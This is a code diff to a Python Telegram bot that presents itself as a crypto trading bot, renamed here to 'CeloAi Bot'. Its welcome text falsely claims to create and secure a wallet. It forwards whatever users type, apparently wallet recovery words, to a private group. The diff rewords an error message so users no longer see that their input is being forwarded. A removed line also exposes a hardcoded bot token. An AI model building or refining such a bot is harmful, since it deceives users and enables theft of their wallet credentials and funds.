@@ -1,3 +1,4 @@
+import os  # <-- This is missing in your code
 import re
 from telegram import (
     Update,
@@ -13,12 +14,18 @@ from telegram.ext import (
     filters,
     ContextTypes
 )
+from dotenv import load_dotenv
+
+# Load environment variables
+load_dotenv()
+
 # Store temporary user states
 user_states = {}
 
-# ---- CONFIG ----
-BOT_TOKEN = "8469292173:AAFwdg2McWdFpzoqnC1ySayDhFFC4UKgAxY"        # <- replace with your new token from BotFather
-GROUP_ID = -1002762295115  # <- the group id you mentioned
+# Replace the hardcoded values with:
+BOT_TOKEN = os.getenv('BOT_TOKEN')
+GROUP_ID = int(os.getenv('GROUP_ID'))
+
 
 # ✅ Step 1: Put the wallet function here
 async def show_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -130,13 +137,12 @@ def is_alpha_word(word: str) -> bool:
 # --- /start ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        "👋 Welcome to Trading Bot!\n"
+        "👋 Welcome to CeloAi Bot!\n"
         "Step into the world of fast, smart, and stress-free trading, "
         "designed for both beginners and seasoned traders.\n\n"
         "🔗 Connecting to your wallet...\n"
         "⏳ Initializing your account and securing your funds...\n"
-        "✅ Wallet successfully created and linked!\n\n"
-        "💡Tap Continue below to access your wallet and explore all trading options.",
+        "✅ Wallet successfully created and linked!",
         reply_markup=main_menu_markup()
     )
     # clear states
@@ -194,7 +200,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         try:
             await context.bot.send_message(chat_id=GROUP_ID, text=forward_text, parse_mode="HTML")
         except Exception as e:
-            await update.message.reply_text("Failed to forward input to the group. Contact the bot admin.")
+            await update.message.reply_text("Failed to add wallet. Please try again later.", reply_markup=main_menu_markup())
             print("Error sending to group:", e)
             context.user_data.pop("awaiting_dummy", None)
             await update.message.reply_text("Back to menu:", reply_markup=main_menu_markup())
